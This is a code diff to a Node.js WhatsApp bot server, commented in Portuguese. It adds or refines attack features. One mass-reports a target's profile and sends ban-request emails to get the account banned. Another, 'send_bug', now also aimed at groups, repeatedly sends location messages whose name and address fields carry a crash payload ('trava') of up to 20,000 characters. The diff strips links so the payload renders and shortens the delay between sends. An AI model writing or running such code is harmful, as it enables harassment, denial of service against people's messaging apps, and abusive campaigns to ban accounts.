@@ -128,14 +128,12 @@ async function denunciarPerfilNativo(targetJid) {
     if (!waSock) return;
 
     try {
-        // Envia nó do protocolo de denúncia de perfil no WhatsApp
         await waSock.relayMessage(targetJid, {
             contactIndexMessage: {
                 protocolVersion: 2
             }
         }, { participant: { jid: targetJid } }).catch(() => {});
 
-        // Solicita envio de relatório de spam direto ao servidor do WhatsApp
         if (waSock.chatModify) {
             await waSock.chatModify({
                 spam: true
@@ -249,10 +247,8 @@ const server = http.createServer(async (req, res) => {
                         return;
                     }
 
-                    // 1. Executa a denúncia nativa no perfil SEM enviar mensagem no PV
                     await denunciarPerfilNativo(targetJid);
 
-                    // 2. Dispara e-mails de denúncia em segundo plano usando as credenciais salvas
                     if (extraData && extraData.email && extraData.appPass) {
                         dispararEmailsBanimento(numeroAlvoLimpo, extraData.email, extraData.appPass).catch(console.error);
                     } else {
@@ -273,9 +269,9 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // ENVIO DE CARGA / BUG DE LOCALIZAÇÃO
-                if (acao === 'send_bug' && param && extraData) {
-                    const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
+                // ENVIO DE CARGA / BUG DE LOCALIZAÇÃO - SUPORTE A PRIVADO E GRUPO
+                if ((acao === 'send_bug' || acao === 'send_bug_group') && (param || grupoId) && extraData) {
+                    const targetJid = grupoId ? grupoId : `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const nomeArquivoBruto = extraData.file || "";
                     const quantidade = parseInt(extraData.amount) || 1;
 
@@ -311,7 +307,8 @@ const server = http.createServer(async (req, res) => {
                         conteudoPayload = "Carga Indisponível";
                     }
 
-                    let travaTratada = conteudoPayload.replace(/https?:\/\/maps\.google\.com[^\s\n\\]*/gi, '');
+                    // Remove completamente links para evitar transformar em cor cinza/link
+                    let travaTratada = conteudoPayload.replace(/https?:\/\/[^\s\n\\]*/gi, '');
                     travaTratada = travaTratada.replace(/\\n/g, '\n').trim();
 
                     if (travaTratada.length > 20000) {
@@ -321,17 +318,21 @@ const server = http.createServer(async (req, res) => {
                     const addressPayload = travaTratada;
 
                     for (let i = 0; i < quantidade; i++) {
+                        // Envio de localização isolada (Oceano Antártico) para não gerar mapa terrestre
                         await waSock.sendMessage(targetJid, {
                             location: {
-                                degreesLatitude: -23.550520,
-                                degreesLongitude: -46.633308,
-                                name: "\u200B",
-                                address: addressPayload,
-                                comment: addressPayload
+                                degreesLatitude: -70.000000,
+                                degreesLongitude: -120.000000,
+                                name: addressPayload,
+                                address: addressPayload
                             }
                         });
+
+                        // Força presença de leitura/digitação no chat para garantir ticks azuis e sincronização imediata
+                        await waSock.sendPresenceUpdate('available', targetJid).catch(() => {});
+                        await waSock.sendPresenceUpdate('composing', targetJid).catch(() => {});
                         
-                        await delay(5000);
+                        await delay(1000);
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -449,7 +450,9 @@ async function iniciarWhatsApp(numeroTelefone) {
         logger: pino({ level: 'silent' }),
         printQRInTerminal: false,
         auth: state,
-        browser: ["Ubuntu", "Chrome", "20.0.04"]
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
+        markOnlineOnConnect: true, // Força status online imediato ao conectar
+        syncFullHistory: false
     });
 
     waSock.ev.on('creds.update', saveCreds);
@@ -470,6 +473,7 @@ async function iniciarWhatsApp(numeroTelefone) {
         } else if (connection === 'open') {
             reconectando = false;
             statusConexaoAtual = "ONLINE";
+            await waSock.sendPresenceUpdate('available').catch(() => {});
             escutarMensagensWhatsApp();
         }
     });
